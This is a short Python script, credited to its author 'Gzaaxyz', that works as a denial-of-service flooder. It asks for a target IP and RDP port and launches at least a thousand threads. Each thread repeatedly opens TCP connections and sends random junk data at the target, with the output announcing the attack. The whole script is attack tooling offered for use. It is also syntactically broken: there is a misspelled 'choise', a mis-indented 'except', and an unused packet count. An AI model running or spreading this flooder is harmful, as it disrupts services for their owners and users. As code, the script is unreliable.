# Coding By Gzaaxyz
# Tools Credit By Gzaaxyz

# Import Module
import random
import socket
import threading
import os
# Info Tools By Gzaaxyz
os.system("clear")

print("________________")

ip = str(input("[/] Enter Ip Rdp : "))
port = int(input("[/] Enter Port Rdp (80/3389) : "))
times = int(input("[/] Enter Packet : "))
threads = int(input("[/] Enter Threads ( min 1000 ) : "))

def run ():
    data = random._urandom(1000)
    i = random.choise(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            print(i +" Sent!!!")
            except socket.error:
                s.close()
                print("[!] Attacking By Gzaaxyz", ip," With Port : ",port,"!")
                
for y in  range(threads):
    th = threading.Thread(target = run)
    th.start()